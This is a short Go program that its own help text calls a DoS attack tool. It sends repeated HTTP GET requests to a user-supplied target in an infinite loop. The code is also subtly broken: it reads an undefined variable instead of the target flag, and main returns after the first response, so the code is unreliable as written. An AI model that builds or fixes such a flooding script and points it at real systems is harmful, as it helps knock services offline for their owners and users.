package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
)

var target = flag.String("target", "", "target to run DoS Attack on")

func main() {
	responseChannel := make(chan interface{})
	flag.Parse()
	if *target == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}
	fmt.Println(*target)
	go func() {
		// infinite loop
		for {
			resp, err := http.Get(*v)
			if err != nil {
				panic(err)
			}
			responseChannel <- resp
		}
	}()
	fmt.Println(<-responseChannel)
}
